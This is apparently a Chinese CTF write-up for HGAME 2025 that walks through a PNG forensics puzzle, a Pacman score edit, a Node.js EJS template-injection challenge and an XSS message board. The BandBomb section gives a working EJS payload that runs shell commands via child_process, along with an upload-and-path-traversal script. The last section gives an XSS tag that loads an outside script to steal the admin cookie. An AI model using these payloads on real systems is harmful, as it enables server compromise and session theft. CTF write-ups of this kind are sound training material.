
### Hakuya Want A Girl Friend

1. 010 Editor 以十六进制粘贴。
2. 执行 file 命令发现是一个压缩包。
3. 010 Editor 重新打开发现压缩包后面有一段数据，将两段数据分开，前者得到一个加密压缩包，后者以 82 60 42 AE 44 4E 45 49 开头，注意到这是 PNG 文件尾按字节翻转之后的结果，因此分离这段数据并使用 Python 脚本再次按字节翻转。
4. PNG 文件损坏，这种情况可能是文件宽高被修改导致的，因此我们使用[另一个脚本](https://blog.csdn.net/ttovlove_/article/details/135091663) CRC 爆破出宽和高。
5. 用 010 Editor 打开 PNG 文件，将高度修改为 779，同时将 CRC 改为这种情况下计算出来的 CRC，查看 PNG 得到密码 To_f1nd_th3_QQ。
6. 使用密码打开压缩包，得到 flag。

按字节翻转文件的脚本如下

```python
def reverse_hex_file(input_file, output_file):
    with open(input_file, 'rb') as f:
        data = f.read()
    
    reversed_data = data[::-1]
    
    with open(output_file, 'wb') as f:
        f.write(reversed_data)

if __name__ == "__main__":
    input_file = 'HGAME2025/input.hex'  # Replace with your input file path
    output_file = 'output.hex'  # Replace with your output file path
    reverse_hex_file(input_file, output_file)
```

### Level 24 Pacman

直接看 game.js，混淆了，看的头大。

console 里面输 score，发现有一个 `_SCORE` 变量，设为 10000，分数变了，那没事了。

手动搞死自己，拿到 flag，控制台也有写，我的是：aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=

使用 CyberChef 先 base64 解码然后凯撒密码偏移量 13，得到：hgame{u_4re_pacman_m4ster}

### Level 47 BandBomb

此题是一个 nodejs 的 SSTI，相关 Payload 如下：

```js
<!-- mortis.ejs -->
<% 
  // 确保 `execSync` 被正确引用并执行命令
  const execSync = process.mainModule.require('child_process').execSync;
  let result = '';
  try {
    result = execSync('env').toString();  // 执行命令并捕获输出
  } catch (error) {
    result = '命令执行失败';
  }
%>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Motris - 文件列表</title>
</head>
<body>
  <h1>文件列表</h1>
  <ul>
    <% if (files && files.length) { %>
      <% files.forEach(file => { %>
        <li><%= file %></li>
      <% }) %>
    <% } else { %>
      <p>没有文件。</p>
    <% } %>
  </ul>

  <!-- 在网页上显示服务器执行的命令输出 -->
  <h2>命令输出</h2>
  <pre><%= result || '无法获取命令输出' %></pre>
</body>
</html>
```

```python
import requests
import json

url = "http://node1.hgame.vidar.club:31862"  # 替换为目标网址

with open("HGAME2025/mortis.ejs", 'r', encoding='utf-8') as file:
    files = {'file': ("mortis.ejs", file)}
    response = requests.post(f"{url}/upload", files=files)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)

data = {
    "oldName": "mortis.ejs",
    "newName": "../views/mortis.ejs"
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(f"{url}/rename", data=json.dumps(data), headers=headers)

print("Status Code:", response.status_code)
print("Response Body:", response.text)
```

之后访问即可拿到 flag。

### Level 69 MysteryMessageBoard

使用 BurpSuite 的 Intruder 跑字典，跑出来 shallot 账号密码是 888888。

使用“留言板 CTF”作为关键字搜索得知本题为 XSS，我们使用 xssaq.com 作为 XSS 记录网站。

留言 `<sCRiPt sRC=//xs.pe/GAS></sCrIpT>`，之后访问 admin 路由让 admin 来访问，在上述网站拿到 admin 的 cookie。

修改 cookie 成 admin 的 cookie，然后访问 flag 路由拿到 flag。